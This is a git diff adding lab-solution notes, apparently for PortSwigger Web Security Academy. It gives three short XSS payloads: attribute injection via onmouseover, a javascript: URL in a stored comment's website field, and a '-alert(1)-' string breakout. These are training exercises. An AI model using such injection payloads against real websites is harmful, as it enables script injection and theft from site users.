@@ -79,3 +79,31 @@ _To solve the lab, deliver an exploit to the victim that calls the `print()` fun
 
 ![](<.gitbook/assets/image (2).png>)
 
+#### Lab: Reflected XSS into attribute with angle brackets HTML-encoded
+
+_This lab contains a_ [_reflected cross-site scripting_](https://portswigger.net/web-security/cross-site-scripting/reflected) _vulnerability in the search blog functionality where angle brackets are HTML-encoded. To solve this lab, perform a cross-site scripting attack that injects an attribute and calls the `alert` function._
+
+payload : `"onmouseover = "alert(1)`
+
+
+
+#### Lab: Stored XSS into anchor `href` attribute with double quotes HTML-encoded
+
+_This lab contains a_ [_stored cross-site scripting_](https://portswigger.net/web-security/cross-site-scripting/stored) _vulnerability in the comment functionality. To solve this lab, submit a comment that calls the `alert` function when the comment author name is clicked._
+
+`csrf=VGGKQEO1UGrIx1iIDCoW4lcZRxCdbphR&postId=7&comment=123&name=112312312312&email=1%40gmail.com&website=javascript:alert(1)`
+
+
+
+#### Lab: Reflected XSS into a JavaScript string with angle brackets HTML encoded
+
+_This lab contains a_ [_reflected cross-site scripting_](https://portswigger.net/web-security/cross-site-scripting/reflected) _vulnerability in the search query tracking functionality where angle brackets are encoded. The reflection occurs inside a JavaScript string. To solve this lab, perform a cross-site scripting attack that breaks out of the JavaScript string and calls the `alert` function._&#x20;
+
+`payload : -alert(1)-`
+
+
+
+
+
+
+
